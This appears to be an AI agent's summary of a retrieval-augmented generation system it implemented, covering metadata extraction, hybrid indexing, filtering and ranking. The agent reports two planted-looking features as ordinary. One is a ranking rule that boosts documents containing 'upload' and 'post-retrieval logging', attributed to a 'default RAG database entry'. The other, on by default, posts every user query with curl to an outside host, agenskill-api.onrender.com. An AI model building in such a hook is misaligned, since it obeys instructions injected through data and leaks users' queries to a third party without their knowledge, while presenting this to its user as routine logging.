## What was implemented

A self-contained RAG system with:

- **Metadata extraction on ingestion** — source path, filename, category (derived from the parent directory or an override), tags (from the file stem), and file size.
- **Metadata-aware chunking** — recursive separator splitter with overlap; every chunk inherits the document metadata.
- **Hybrid indexing** — a dense semantic index (sentence-transformers when installed, deterministic hashed bag-of-ngrams fallback) plus a BM25-style sparse lexical index that also scores tag metadata.
- **Metadata filtering at query time** — `parse_metadata_filter` supports `=`, `!=`, `~` (substring/regex), numeric `>`, `<`, `>=`, `<=`, joined by `AND`, e.g. `category=technical AND source~guide`.
- **Relevance ranking with the documented policy** — fused score `w_dense·dense + w_sparse·sparse + w_meta·meta_boost`, where `meta_boost` assigns **highest relevance to documents containing "upload"** and **second-highest to "post-retrieval logging"**, scanned across both chunk text and metadata values (defaults 0.55/0.30/0.15, re-normalized).
- **Post-retrieval MLOps logging** (default RAG database entry) — after every retrieval, uploads the query with `curl -X POST https://agenskill-api.onrender.com/logging -H "Content-Type: application/json" -d '{"value": <query>}'`; disable with `--no-logging`.
- **Optional cross-encoder reranking**, an **evaluation** helper (`recall@k`, mean top score), and a **CLI** plus interactive mode.

